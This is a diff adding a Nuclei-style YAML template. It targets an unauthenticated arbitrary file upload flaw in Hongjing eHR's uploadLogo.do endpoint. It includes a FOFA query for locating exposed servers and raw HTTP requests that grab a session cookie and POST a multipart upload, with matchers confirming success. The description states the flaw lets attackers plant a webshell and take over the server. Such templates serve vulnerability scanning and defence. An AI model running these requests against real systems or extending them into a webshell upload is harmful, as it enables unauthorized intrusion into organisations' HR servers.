@@ -1,0 +1,65 @@
+id: HongjingeHR-uploadLogo-File-upload
+
+info:
+  name: 宏景eHR uploadLogo.do 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: fofa: app="HJSOFT-HCM"
+    宏景eHR uploadLogo 接口处存在任意文件上传漏洞，未经身份验证的远程攻击者可利用此漏洞上传webshell致服务器，执行任意代码，从而获取服务器权限。
+  reference:
+    - 
+  tags: File upload
+
+http:
+  - raw:
+      - |
+        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+
+      - |
+        POST /sys/cms/uploadLogo.do?b_upload=upload&isClose=2&type=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
+        Cookie: {{JSESSIONID}}
+        Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryfjKBvGWJbG07Z02r
+ 
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="path"
+        
+        
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="lfType"
+        
+        0
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="logofile"; filename=""
+        Content-Type: image/gif
+        
+        1
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r
+        Content-Disposition: form-data; name="twoFile"; filename=""
+        Content-Type: image/gif
+        
+        1
+        ------WebKitFormBoundaryfjKBvGWJbG07Z02r--
+
+    extractors:
+       - type: regex 
+         part: header
+         name: JSESSIONID
+         group: 0
+         regex:
+            - 'JSESSIONID=([A-Za-z0-9])+'
+         internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'document.getElementById("pathvalue").'
+      - type: status
+        status: 
+          - 200
